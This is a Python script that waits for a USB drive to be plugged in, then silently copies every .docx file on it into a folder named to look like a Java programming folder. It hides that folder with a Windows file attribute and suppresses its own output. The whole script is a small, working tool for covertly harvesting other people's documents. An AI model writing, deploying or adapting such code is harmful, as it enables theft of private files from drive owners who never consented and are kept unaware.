import time
import ctypes
x = 1
def hide_folder_windows(folder_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 2)  # Set "hidden" attribute
        #print(f"Folder '{folder_path}' has been successfully hidden.")
    except Exception as e:
        print()
def copy_data(s):
    # Copy pptx file from one storage to another
    import shutil
    import os
    source_folder = s
    target_folder = 'E:/java_progr_amm/'
    os.makedirs(target_folder)
    for dirs, subdirs, files in os.walk(source_folder):
        for file in files:
            if file.endswith(".docx"):
                # print(file)
                filename = os.path.join(source_folder, dirs, file)
                if os.path.exists(filename):
                    # print(filename)
                    shutil.copy(filename, target_folder)         
                    # Example usage:
                    folder_to_hide = 'E:/java_progr_amm'  # Path of the folder you want to hide
                    hide_folder_windows(folder_to_hide)
    # print(len(os.listdir(target_folder))) # This prints the number of files in our target folder
def detect_usb_drives_function():
    import psutil
    global x
    def detect_usb_drives():
        #print("not found")    this will hide the message of not found
        all_drives = psutil.disk_partitions()
        usb_drives = []
        for drive in all_drives:
           if 'removable' in drive.opts:
               usb_drives.append(drive.device)
        return usb_drives
    if __name__ == "__main__":
      usb_drives = detect_usb_drives()
    while(usb_drives==[]):
        global x
        time.sleep(10)
        x=x+1
        if(x<=120):#this will find for usb connection untill 20 min as each loop=10s
            detect_usb_drives_function()
        else:
            exit()
    if usb_drives:# this block will gate  execute when pen drive is attached to pc
        path_list = usb_drives# 
        pen_char = path_list[0].replace('\\', '/')
        copy_data(pen_char)
        #copy_data()  #this function copy specific data from one location to another
        exit()       
if(x<=1):
    detect_usb_drives_function()
else:
    exit()